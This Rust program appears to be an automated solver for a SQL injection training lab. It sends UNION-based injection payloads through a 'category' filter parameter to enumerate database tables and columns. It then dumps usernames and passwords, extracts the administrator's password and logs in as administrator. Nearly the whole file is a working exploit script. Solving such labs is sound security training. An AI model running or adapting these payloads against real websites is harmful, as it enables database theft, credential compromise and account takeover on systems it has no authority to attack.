use regex::Regex;
use scraper::{Html, Selector};
use server_side_sql_injection::{
    HTTP_CLIENT, check_is_lab_solved, find_columns_of_type_string, find_no_of_columns,
    generate_clap_parser, login_as_administrator, print_tables,
};
use std::iter::zip;
use std::sync::LazyLock;

static USERS_TABLE_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\busers_.+?\b").expect("[-] Failed to generate USERS_TABLE_REGEX")
});

static TABLE_TH_SELECTOR: LazyLock<Selector> = LazyLock::new(|| {
    Selector::parse("table tbody tr th").expect("Failed to construct the TABLE_TH_SELECTOR")
});

static TABLE_TD_SELECTOR: LazyLock<Selector> = LazyLock::new(|| {
    Selector::parse("table tbody tr td").expect("Failed to construct the TABLE_TD_SELECTOR")
});

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");
    let lab_url_with_endpoint = format!("{lab_url}/filter?category=");

    let users_table_name: String;
    let mut username_column_name: Option<String> = None;
    let mut password_column_name: Option<String> = None;
    let administrator_password: Option<String>;

    let columns = find_no_of_columns(&lab_url_with_endpoint, Some("-- -"), None);

    find_columns_of_type_string(&lab_url_with_endpoint, columns, Some("-- -"), None);

    logger::info("Finding the users table name");
    logger::info("Fetching the information_schema.tables");

    let query = "' UNION SELECT NULL, TABLE_NAME FROM information_schema.tables --";

    logger::info(format!("Making query: {}/filter?category={}", lab_url, query).as_ref());

    let response = HTTP_CLIENT
        .get(format!("{}/filter?category={}", lab_url, query))
        .send()
        .expect("[-] Failed to make the GET request");

    if response.status() == 200 {
        let body = response
            .text()
            .expect("[-] Failed to extract text from body");

        let results = USERS_TABLE_REGEX
            .captures(&body)
            .expect("[-] There is no captures for USERS_TABLE_REGEX");

        users_table_name = results
            .get(0)
            .expect("[-] There is no captures for USERS_TABLE_REGEX")
            .as_str()
            .to_string();

        logger::success(
            format!(
                "Successfully enumerated the users table name: {}",
                users_table_name
            )
            .as_ref(),
        );
    } else {
        panic!(
            "{}",
            logger::error_return("Failed to fetch the information_schema.tables")
        )
    }

    logger::info("Fetching the column names from the users table");
    logger::info(
        format!("Fetching the information_schema.columns for table {users_table_name}").as_ref(),
    );

    let query = format!(
        "' UNION SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE table_name='{}'--",
        users_table_name
    );

    logger::info(format!("Making query: {lab_url}/filter?category={query}").as_ref());

    let response = HTTP_CLIENT
        .get(format!("{}/filter?category={}", lab_url, query))
        .send()
        .expect("[-] Failed to fetch the column names from the users table");

    if response.status() == 200 {
        let document = Html::parse_document(
            response
                .text()
                .expect("[-] Failed to extract the body")
                .as_ref(),
        );

        let column_names: Vec<String> = document
            .select(&TABLE_TH_SELECTOR)
            .flat_map(|element_ref| element_ref.text())
            .map(str::to_string)
            .collect();

        let data_types: Vec<String> = document
            .select(&TABLE_TD_SELECTOR)
            .flat_map(|element_ref| element_ref.text())
            .map(str::to_string)
            .collect();

        for column in &column_names {
            if column.starts_with("password_") {
                password_column_name = Some(column.to_string())
            }
            if column.starts_with("username_") {
                username_column_name = Some(column.to_string())
            }
        }

        let zipped: Vec<Vec<String>> = zip(column_names, data_types)
            .map(|(column_name, data_type)| vec![column_name, data_type])
            .collect();

        logger::success(
            format!("Found the column names of the table `{}`", users_table_name).as_ref(),
        );

        print_tables(vec!["Column Name", "Data Type"], zipped);
    } else {
        panic!(
            "{}",
            logger::error_return(
                "Failed to fetch the information_schema.columns for the users table"
            )
        )
    }

    logger::info(format!("Fetching the rows from the `{}` table", users_table_name).as_ref());

    let username_column_name = username_column_name.unwrap();
    let password_column_name = password_column_name.unwrap();

    if !username_column_name.is_empty() && !password_column_name.is_empty() {
        let query = format!(
            "' UNION SELECT {}, {} FROM {}--",
            username_column_name, password_column_name, users_table_name
        );

        logger::info(format!("Making query: {lab_url}/filter?category={query}").as_ref());

        let response = HTTP_CLIENT
            .get(format!("{}/filter?category={}", lab_url, query))
            .send()
            .expect("[-] Failed to fetch the rows from the users table");

        if response.status() == 200 {
            let document = Html::parse_document(
                response
                    .text()
                    .expect("[-] Failed to extract the body")
                    .as_ref(),
            );

            let usernames: Vec<String> = document
                .select(&TABLE_TH_SELECTOR)
                .flat_map(|element_ref| element_ref.text())
                .map(str::to_string)
                .collect();

            let passwords: Vec<String> = document
                .select(&TABLE_TD_SELECTOR)
                .flat_map(|element_ref| element_ref.text())
                .map(str::to_string)
                .collect();

            administrator_password = usernames
                .iter()
                .position(|u| u == "administrator")
                .map(|index| passwords[index].to_string());

            let zipped: Vec<Vec<String>> = zip(usernames, passwords)
                .map(|(column_name, data_type)| vec![column_name, data_type])
                .collect();

            logger::success(
                format!("Fetched the rows of the table `{}`", users_table_name).as_ref(),
            );

            print_tables(vec![&username_column_name, &password_column_name], zipped);
        } else {
            panic!(
                "{}",
                logger::error_return(
                    "Failed to fetch the information_schema.columns for the users table"
                )
            )
        }
    } else {
        panic!(
            "{}",
            logger::error_return("username_column_name or password_column_name is empty")
        )
    }

    let administrator_password =
        administrator_password.expect("[-] Administrator password not found");

    if !administrator_password.is_empty() {
        logger::success(format!("Found administrator password: {administrator_password}").as_ref());

        login_as_administrator(lab_url, administrator_password);
    } else {
        panic!(
            "{}",
            logger::error_return("administrator_password is empty")
        )
    }

    check_is_lab_solved(lab_url);
}
